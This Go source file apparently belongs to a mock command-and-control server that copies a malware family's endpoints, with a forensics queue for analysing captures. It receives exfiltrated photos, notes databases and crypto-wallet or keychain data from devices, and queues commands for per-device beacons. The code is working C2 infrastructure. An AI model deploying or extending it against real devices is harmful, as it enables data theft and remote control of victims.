package server

import (
	"encoding/json"
	"net/http"
	"path/filepath"
	"strconv"
	"strings"
	"time"

	"mockc2/internal/config"
	"mockc2/internal/forensics"
	"mockc2/internal/store"
)

// HQ 自动收集上报（c2_agent phase-2 同族端点）。

func hqSink(w http.ResponseWriter, r *http.Request, folder, ext string) {
	body := readBody(r)
	s := config.Get()
	store.GetStore().SaveBody(folder, body, ext, s.BodyCaptureLimit, clientIP(r))
	writeJSON(w, http.StatusOK, map[string]any{"status": "ok"})
}

func registerHQ(rt *Router) {
	rt.POST("/event", func(w http.ResponseWriter, r *http.Request, _ map[string]string) {
		hqSink(w, r, "event", "json")
	})
	rt.POST("/a", func(w http.ResponseWriter, r *http.Request, _ map[string]string) {
		hqSink(w, r, "a", "json")
	})
	rt.POST("/u", func(w http.ResponseWriter, r *http.Request, _ map[string]string) {
		hqSink(w, r, "u", "json")
	})
	rt.POST("/nb", func(w http.ResponseWriter, r *http.Request, _ map[string]string) {
		body := readBody(r)
		s := config.Get()
		rec := store.ProcessNB(body, s.CaptureRoot, "") // 备忘录解析 + 完整 db 落盘 + 路径记录
		store.GetStore().SaveBody("nb", body, "json", s.BodyCaptureLimit, clientIP(r))
		out := map[string]any{"status": "ok"}
		for k, v := range rec {
			out[k] = v
		}
		writeJSON(w, http.StatusOK, out)
	})
	// 照片回传：正确端点是 /p（线上实测设备用 /p）。/ph 为历史别名，统一落 capture/p。
	photoSink := func(w http.ResponseWriter, r *http.Request, _ map[string]string) {
		ct := r.Header.Get("Content-Type")
		ext := "bin"
		if strings.Contains(ct, "multipart") {
			ext = "multipart.bin"
		}
		hqSink(w, r, "p", ext)
	}
	rt.POST("/p", photoSink)
	rt.POST("/ph", photoSink)
	rt.POST("/wallet", func(w http.ResponseWriter, r *http.Request, _ map[string]string) {
		hqSink(w, r, "wallet", "json")
	})

	// 战果/战绩回传端点
	rt.Add([]string{"GET", "POST"}, "/war", func(w http.ResponseWriter, r *http.Request, _ map[string]string) {
		body := readBody(r)
		s := config.Get()
		// 真实落盘相对路径（<uuid>_<ts>-<rand>.json）；小包未落盘时为空串。
		rel := store.GetStore().SaveBody("war", body, "json", s.BodyCaptureLimit, clientIP(r))
		// 钱包映射索引 /war keychain.wallets（包序自 packets 索引取最新一条）
		var packetID *int64
		if row := store.GetDB().QueryOne(
			"SELECT id FROM packets WHERE endpoint='war' ORDER BY id DESC LIMIT 1"); row != nil {
			id := store.ToInt(row["id"])
			packetID = &id
		}
		rec := map[string]any(nil)
		store.SafeCall(func() { rec = store.ProcessWar(body, packetID, rel) })
		// 自动后台检测：新回传的 /war 入队（tools/smart_forensics.py，结果落 war_scan）。
		if packetID != nil && rel != "" {
			var wj map[string]any
			if json.Unmarshal(body, &wj) == nil {
				u := store.ToStr(wj["device_uuid"])
				if u == "" {
					u = store.ToStr(wj["lhu"])
				}
				forensics.Enqueue(*packetID, filepath.Join(s.CaptureRoot, filepath.FromSlash(rel)), u)
			}
		}
		wallets, _ := rec["wallets"].([]any)
		if len(wallets) > 0 {
			var parts []string
			for _, wv := range wallets {
				wm, _ := wv.(map[string]any)
				parts = append(parts, store.ToStr(wm["rule"])+":"+store.ToStr(wm["count"]))
			}
			w.Header().Set("X-Wallets", strings.Join(parts, ","))
		}
		writeJSON(w, http.StatusOK, map[string]any{"status": "ok", "wallets_indexed": len(wallets)})
	})
}

func timeName() string {
	return time.Now().Format("20060102-150405")
}

// L1 加密批次资源：/res/{S}/{hash}。mock 不部署加密批次，保持原站 404 行为。
func registerL1Res(rt *Router) {
	rt.GET("/res/{s}/{h}", func(w http.ResponseWriter, r *http.Request, _ map[string]string) {
		writeText(w, http.StatusNotFound, "404 Not Found")
	})
}

// 运维观测端点（带 token 守卫，可关闭）。
func registerOps(rt *Router) {
	checkToken := func(r *http.Request) bool {
		expected := config.Get().OpsToken
		if expected == "" {
			return true
		}
		return r.Header.Get("X-Ops-Token") == expected
	}

	rt.GET("/__stats", func(w http.ResponseWriter, r *http.Request, _ map[string]string) {
		if !checkToken(r) {
			writeJSON(w, http.StatusUnauthorized, map[string]any{"error": "unauthorized"})
			return
		}
		writeJSON(w, http.StatusOK, store.DBStats())
	})

	rt.GET("/__control", func(w http.ResponseWriter, r *http.Request, _ map[string]string) {
		if !checkToken(r) {
			writeJSON(w, http.StatusUnauthorized, map[string]any{"error": "unauthorized"})
			return
		}
		q := store.GetQueue()
		writeJSON(w, http.StatusOK, map[string]any{
			"command": q.Current(), "once": q.Once(),
			// 按设备队列总览：每台 pending/dispatched 各多少（前端设备控制台用）
			"device_commands": q.ListTargets(),
		})
	})

	rt.POST("/__control", func(w http.ResponseWriter, r *http.Request, _ map[string]string) {
		if !checkToken(r) {
			writeJSON(w, http.StatusUnauthorized, map[string]any{"error": "unauthorized"})
			return
		}
		body := readBody(r)
		payload := map[string]any{}
		if len(body) > 0 {
			if err := json.Unmarshal(body, &payload); err != nil {
				writeJSON(w, http.StatusBadRequest, map[string]any{"error": "bad json"})
				return
			}
		}
		if _, ok := payload["type"]; ok {
			once := true
			if v, ok := payload["once"].(bool); ok {
				once = v
			}
			var params map[string]any
			if p, ok := payload["params"].(map[string]any); ok {
				params = p
			}
			cmdType := store.ToStr(payload["type"])

			// targets：按设备批量武装（每台各写一条独立队列记录）
			targets := []string{}
			if tv, ok := payload["targets"].([]any); ok {
				for _, v := range tv {
					if s := store.ToStr(v); s != "" {
						targets = append(targets, s)
					}
				}
			}
			if len(targets) == 0 {
				if t := store.ToStr(payload["target"]); t != "" {
					targets = append(targets, t)
				}
			}

			if len(targets) > 0 {
				// 批量异步：每台设备各写一条独立队列记录，各自被自己的 beacon 领走
				batchID := store.ToStr(payload["batch_id"])
				if batchID == "" && len(targets) > 1 {
					batchID = "b-" + strconv.FormatInt(time.Now().UnixMilli(), 10)
				}
				armed := make([]any, 0, len(targets))
				for _, t := range targets {
					armed = append(armed, store.GetQueue().SetFor(t, cmdType, params, once, "", batchID))
				}
				store.GetStore().WriteJSONL("control.jsonl", map[string]any{
					"action": "arm_batch", "batch_id": batchID, "count": len(targets),
					"type": cmdType, "cmds": armed})
				writeJSON(w, http.StatusOK, map[string]any{
					"ok": true, "batch_id": batchID, "count": len(targets), "commands": armed})
				return
			}

			cmd := store.GetQueue().Set(cmdType, params, once, "")
			store.GetStore().WriteJSONL("control.jsonl", map[string]any{"action": "arm", "cmd": cmd})
			store.SafeCall(func() { store.CommandArmed(cmd, once) })
		}
		if v, ok := payload["command"]; ok && v == nil {
			// 清 target：只取消该设备的待发指令（不影响其它设备）
			if t := store.ToStr(payload["target"]); t != "" {
				store.GetQueue().ClearFor(t)
				store.GetStore().WriteJSONL("control.jsonl", map[string]any{"action": "disarm", "target": t})
				writeJSON(w, http.StatusOK, map[string]any{"ok": true, "cleared_target": t})
				return
			}
			store.GetQueue().Clear()
			store.GetStore().WriteJSONL("control.jsonl", map[string]any{"action": "disarm"})
		}
		if v, ok := payload["beacon"]; ok {
			if _, hasType := payload["type"]; !hasType {
				if v == nil {
					store.GetControl().ResetNoop()
				} else if m, ok := v.(map[string]any); ok {
					store.GetControl().SetResponse(m)
				}
			}
		}
		store.GetStore().WriteJSONL("control.jsonl", payload)
		writeJSON(w, http.StatusOK, map[string]any{"ok": true})
	})
}
